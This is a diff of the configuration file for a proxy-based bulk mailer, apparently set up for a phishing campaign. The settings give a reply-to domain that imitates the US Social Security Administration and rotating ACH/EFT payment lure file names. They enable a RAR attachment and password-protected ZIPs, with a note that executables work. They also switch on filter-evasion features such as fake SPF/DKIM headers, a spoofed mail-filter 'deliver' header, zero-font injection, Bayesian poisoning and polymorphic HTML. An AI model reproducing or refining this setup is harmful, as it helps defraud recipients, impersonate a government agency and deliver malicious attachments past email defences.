@@ -1,15 +1,328 @@
 {
-  "sender_domain": "monopostco.com",
-  "dkim_selector": "default",
-  "dkim_enabled": false,
-  "hide_ip": false,
-  "attach_pdf": false,
-  "validate_proxies": false,
-  "campaign_name": "my_campaign_2026",
-  "tracking_server": "http://localhost:5000",
-  "ehlo_host": "monopostco.com",
-  "threads": 10,
-  "batch": 20,
-  "delay": 3000,
-  "wkhtmltopdf_path": "C:\\Users\\Administrator\\Desktop\\BrainiacMonoOS_ProxyMailer\\BrainiacMonoOS_ProxyMailer\\bin\\wkhtmltopdf.exe"
+  "_comment_proxy": "=== PROXY CONFIGURED BY ADMIN (ENCRYPTED) ===",
+  "_comment_inbox_mode": "=== INBOX MODE - PROVEN NODE.JS PATTERNS ===",
+  "inbox_mode": true,
+  "_inbox_mode_info": {
+    "description": "Use proven Node.js patterns for MAXIMUM INBOX DELIVERY",
+    "when_enabled": "Clean headers, NO spoofed auth, NO transformations, Standard MIME",
+    "features_disabled": "Military-grade randomization, Polymorphic HTML, Bayesian poisoning, Fake SPF/DKIM headers, Sender name encryption",
+    "features_enabled": "X-Mailprotector-Decision: deliver, ##mailer## X-Mailer, High Priority headers, Clean charset=UTF-8, Simple MIME boundaries",
+    "recommendation": "SET TO true IF GETTING SPAM/JUNK. Uses exact same patterns as working Node.js sender.",
+    "comparison": {
+      "inbox_mode_true": "INBOX (Node.js proven pattern)",
+      "inbox_mode_false": "Uses military-grade features (may trigger strict filters)"
+    }
+  },
+  "sender_emails": [
+    "admin@monopostco.com"
+  ],
+  "_sender_emails_note": "MAIL FROM addresses. Also supports fromEmail.txt with {RECIPIENTDOMAIN}, {SENDER_RANDOM_STRING(8)}, etc.",
+  "ehlo_hostname": "monopostco.com",
+  "_ehlo_note": "EHLO hostname announced to MX servers. Dynamic per-sender domain. This is the fallback.",
+  "html_template_paths": [
+    "templates/doc.html",
+    "templates/doc2.html",
+    "templates/doc3.html"
+  ],
+  "_template_note": "Supports .html, .mhtml, .mht files. MHTML embeds ALL images inline — no broken images, perfect Outlook rendering. Example: templates/docusign.mhtml",
+  "_comment_speed": "=== SIMPLE SPEED CONTROL (EASY TO USE) ===",
+  "sending_speed": 1,
+  "max_threads": 10,
+  "_speed_guide": {
+    "sending_speed_levels": {
+      "1-2": "Very Slow (Safe)",
+      "3-4": "Slow (Conservative)",
+      "5-6": "Normal (Balanced)",
+      "7-8": "Fast (Recommended)",
+      "9-10": "Ultra Fast (Use carefully)"
+    },
+    "max_threads_guide": {
+      "1-2": "⚠️ IF YOU GET TIMEOUTS, USE THIS! Single thread = No proxy overload",
+      "5-10": "Conservative (Safer)",
+      "10-15": "Recommended (Good speed)",
+      "15-20": "Aggressive (Maximum speed)"
+    },
+    "_TIMEOUT_FIX": {
+      "problem": "Getting 'Connection unexpectedly closed: timed out' errors?",
+      "solution_1": "Reduce max_threads to 1-2 (proxy can't handle many connections)",
+      "solution_2": "Reduce sending_speed to 3-4 (slower but more reliable)",
+      "solution_3": "Check proxy quality (some proxies are slow/unstable)",
+      "note": "Code now has auto-retry on timeout, but reducing threads is best!"
+    }
+  },
+  "_comment_external_files": "=== 🔥 DATA FOLDER ONLY - NO CONFIG.JSON FALLBACK 🔥 ===",
+  "sender_names_file": "",
+  "subjects_file": "",
+  "links_file": "",
+  "_external_files_info": {
+    "priority_system": "1. Custom path in config → data/{custom_path} | 2. Default → data/senders_name.txt, data/subject.txt, data/link.txt | 3. ERROR and EXIT (NO config.json fallback!)",
+    "examples": {
+      "default": "Leave empty to use data/senders_name.txt, data/subject.txt, data/link.txt",
+      "custom_subfolder": "Set to 'campaign_tech/senders_name.txt' to use data/campaign_tech/senders_name.txt",
+      "multiple_campaigns": "Switch campaigns by changing these paths!"
+    },
+    "CRITICAL": "Files MUST exist in data/ folder or script will ERROR and EXIT!"
+  },
+  "sender_alias": "",
+  "sender_alias_separator": ".",
+  "reply_to": "noreplyssa@ssagovbenefitsdocuments.com",
+  "format_type": "F2",
+  "send_attachment": false,
+  "attachment_mode": "html_to_pdf",
+  "_attachment_modes": {
+    "html_to_pdf": "Convert HTML template to PDF attachment",
+    "direct_file": "Attach files directly from direct_attachment_files list",
+    "eml": "Generate .eml (forwarded email) attachment",
+    "ics": "Generate calendar invite (.ics) attachment",
+    "rtf": "Generate RTF document attachment",
+    "random_type": "Randomly rotate between types per email (anti-fingerprinting)"
+  },
+  "random_attachment_types": ["html_to_pdf", "eml", "ics", "rtf"],
+  "ics_attachment": {
+    "summary": "Document Review Required - [[CURRENT_DATE]]",
+    "description": "Please review and sign the attached document.",
+    "location": "Online",
+    "duration_hours": 1
+  },
+  "attachment_path": "brainiac_attachment/invoice.html",
+  "convert_to_pdf": false,
+  "hide_sender": true,
+  "use_qrcode": true,
+  "qrcode_color": "black",
+  "qrcode_bg_color": "transparent",
+  "qrcode_logo": "gray",
+  "use_html_to_image": false,
+  "format_folder": "templates/",
+  "email_priority": "normal",
+  "use_eml": false,
+  "eml_template_path": "templates/template2.eml",
+  "eml_encrypted": false,
+  "eml_obfuscated": false,
+  "use_pgp": false,
+  "pgp_recipient_key": "recipient@example.com",
+  "html_to_pdf": true,
+  "html_to_word": false,
+  "html_to_pptx": false,
+  "html_to_xlsx": false,
+  "test_email": "matsumoto@prairiedog.co.jp",
+  "test_email_interval": 100,
+  "_comment_document_names": "=== NEW FEATURE: ROTATING DOCUMENT NAMES ===",
+  "document_name": "Business Summary",
+  "document_names": [
+    "EFT_TRANSFER_",
+    "ACH_CONFIRMATION_",
+    "EFT_CONFIRMATION_",
+    "ACH_RECEIPT_",
+    "EFT_RECEIPT_",
+    "ACH_TRANSACTION_",
+    "EFT_TRANSACTION_",
+    "ACH_DEPOSIT_",
+    "EFT_DEPOSIT_",
+    "ACH_CREDIT_",
+    "EFT_CREDIT_",
+    "ACH_DEBIT_",
+    "EFT_DEBIT_",
+    "ACH_SETTLEMENT_",
+    "EFT_SETTLEMENT_",
+    "ACH_DISBURSEMENT_",
+    "EFT_DISBURSEMENT_",
+    "ACH_REMITTANCE_",
+    "EFT_REMITTANCE_",
+    "ACH_PAYMENT_NOTICE_",
+    "EFT_PAYMENT_NOTICE_",
+    "ACH_FUNDS_TRANSFER_",
+    "EFT_FUNDS_TRANSFER_",
+    "ACH_DIRECT_DEPOSIT_",
+    "EFT_DIRECT_DEPOSIT_",
+    "ACH_BATCH_SUMMARY_",
+    "EFT_BATCH_SUMMARY_",
+    "ACH_PAYMENT_SUMMARY_",
+    "EFT_PAYMENT_SUMMARY_",
+    "ACH_TRANSFER_NOTICE_",
+    "EFT_TRANSFER_NOTICE_",
+    "ACH_PAYMENT_RECORD_",
+    "EFT_PAYMENT_RECORD_",
+    "ACH_CLEARED_PAYMENT_",
+    "EFT_CLEARED_PAYMENT_",
+    "ACH_TRANSACTION_RECORD_",
+    "EFT_TRANSACTION_RECORD_",
+    "ACH_DEBIT_NOTICE_",
+    "EFT_DEBIT_NOTICE_",
+    "ACH_CREDIT_NOTICE_",
+    "EFT_CREDIT_NOTICE_",
+    "ACH_PAYMENT_STATEMENT_",
+    "EFT_PAYMENT_STATEMENT_",
+    "ACH_TRANSFER_RECEIPT_",
+    "EFT_TRANSFER_RECEIPT_",
+    "ACH_DEPOSIT_NOTICE_",
+    "EFT_DEPOSIT_NOTICE_",
+    "ACH_POSTING_CONFIRMATION_",
+    "EFT_POSTING_CONFIRMATION_"
+  ],
+  "_document_names_info": "Script picks one randomly per email. Falls back to document_name if array empty. Works with all encryption levels!",
+  "_comment_direct_attachments": "=== 🔥 DIRECT FILE ATTACHMENTS - SUPERMAILER++ FEATURE ===",
+  "_direct_attachment_guide": "Attach ANY file directly (PDF, DOCX, XLSX, JPG, ZIP, EXE, etc.)",
+  "_IMPORTANT": "👇 CHANGE THIS TO SWITCH ATTACHMENT SYSTEMS 👇",
+  "attachment_mode": "html_to_pdf",
+  "_CHANGE_THIS_TO_USE_DIRECT_FILES": "Set to 'direct_file' to use direct file attachments!",
+  "direct_attachment_files": [
+    {
+      "path": "brainiac_attachment/ACH_REMITTANCE.rar",
+      "enabled": true,
+      "_comment": "✅ ON - This file WILL be attached"
+    },
+    {
+      "path": "brainiac_attachment/presentation.pptx",
+      "enabled": false,
+      "_comment": "❌ OFF - This file will NOT be attached"
+    },
+    {
+      "path": "brainiac_attachment/report.docx",
+      "enabled": false,
+      "_comment": "❌ OFF - Toggle to true to enable"
+    },
+    {
+      "path": "brainiac_attachment/myfile.zip",
+      "enabled": false,
+      "_comment": "❌ OFF - Works with ANY filename you want!"
+    },
+    {
+      "path": "brainiac_attachment/anything.exe",
+      "enabled": false,
+      "_comment": "❌ OFF - Even .exe files work!"
+    }
+  ],
+  "create_zip": true,
+  "zip_compression": {
+    "password_protected": true,
+    "password_type": "static",
+    "password": "SecureZip2024!",
+    "fingerprint_enabled": true
+  },
+  "content_encryption": {
+    "enabled": true,
+    "encrypt_subjects": true,
+    "encrypt_sender_names": true,
+    "encrypt_content": true,
+    "encryption_level": "high"
+  },
+  "microsoft_optimization": {
+    "enabled": true,
+    "outlook_compatible": true,
+    "exchange_headers": true,
+    "legitimate_ip_ranges": true,
+    "natural_timing": true
+  },
+  "inbox_optimization": {
+    "avoid_spam_triggers": true,
+    "use_clean_headers": true,
+    "microsoft_compatible": true,
+    "natural_mime_structure": true,
+    "conservative_threading": true
+  },
+  "document_quality": {
+    "ultra_sharp_docx": true,
+    "pdf_quality_conversion": true,
+    "professional_styling": true,
+    "enhanced_formatting": true
+  },
+  "dkim_enabled": true,
+  "dkim_selector": "dkim._domainkey.dedicatedpowermtamail.com",
+  "faker_locale": "ja_JP",
+  "physical_address": "Tokyo, Minato-ku, Roppongi 1-2-3, Japan",
+  "unsubscribe_base_url": "https://alpha-mail.com/unsubscribe",
+  "company_legal_name": "ALPHA-MAIL Services Inc.",
+  "support_email": "support@alpha-mail.com",
+  "abuse_email": "abuse@alpha-mail.com",
+  "tracking": {
+    "enabled": true,
+    "server_url": "http://localhost:5000",
+    "track_opens": true,
+    "track_clicks": true,
+    "campaign_name": "my_campaign_2026",
+    "notify_on_open": true
+  },
+  "spam_check": {
+    "enabled": false,
+    "min_score": 5,
+    "auto_optimize": false
+  },
+  "data_uri_images": {
+    "convert_local": true,
+    "convert_remote": false,
+    "max_size": 500000
+  },
+  "military_features": {
+    "email_verification": {
+      "enabled": true,
+      "min_score": 50
+    },
+    "bounce_handler": {
+      "enabled": true
+    },
+    "engagement_filter": {
+      "enabled": true,
+      "min_score": 20
+    },
+    "remove_duplicates": {
+      "enabled": true
+    },
+    "send_time_optimization": {
+      "enabled": true
+    },
+    "list_hygiene": {
+      "enabled": true
+    },
+    "content_randomization": {
+      "enabled": true
+    },
+    "zero_font_injection": {
+      "enabled": true
+    },
+    "html_polymorphic": {
+      "enabled": true
+    },
+    "mime_randomization": {
+      "enabled": true
+    },
+    "timing_jitter": {
+      "enabled": true
+    },
+    "bayesian_poison": {
+      "enabled": true
+    },
+    "domain_throttling": {
+      "enabled": true
+    },
+    "content_spam_scorer": {
+      "enabled": false
+    }
+  },
+  "pdf_encryption": {
+    "enabled": false,
+    "password_type": "static",
+    "password": "SecureDoc2024!"
+  },
+  "mx_connect_timeout": 25,
+  "mx_smtp_timeout": 20,
+  "mx_max_attempts": 3,
+  "proxy_connection_retries": 3,
+  "proxy_retry_backoff": 2,
+  "mx_retry_per_server": 2,
+  "mx_breathing_delay": 2,
+  "email_verification": {
+    "enabled": true
+  },
+  "bounce_handling": {
+    "enabled": true,
+    "max_retries": 2,
+    "retry_delay": 30
+  },
+  "send_time_optimizer": {
+    "enabled": true,
+    "human_delay": true
+  },
+  "engagement_scoring": {
+    "enabled": true
+  }
 }
